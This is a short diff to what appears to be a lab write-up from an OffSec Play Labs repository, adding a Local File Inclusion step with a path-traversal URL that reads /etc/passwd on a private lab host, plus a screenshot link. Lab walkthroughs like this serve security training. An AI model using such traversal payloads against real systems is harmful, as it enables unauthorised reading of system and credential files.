@@ -219,3 +219,9 @@ http://192.168.207.14/secret_information/?lang=en.php
 ```
 ![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/2ee1a948-2a06-48e3-a0c2-2d70ff984290)
 
+Local File Inclusion (LFI)
+```
+http://192.168.207.14/secret_information/?lang=../../../../../../../../etc/passwd
+```
+![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/6417837f-5013-4861-8de8-2bb744cf28ef)
+
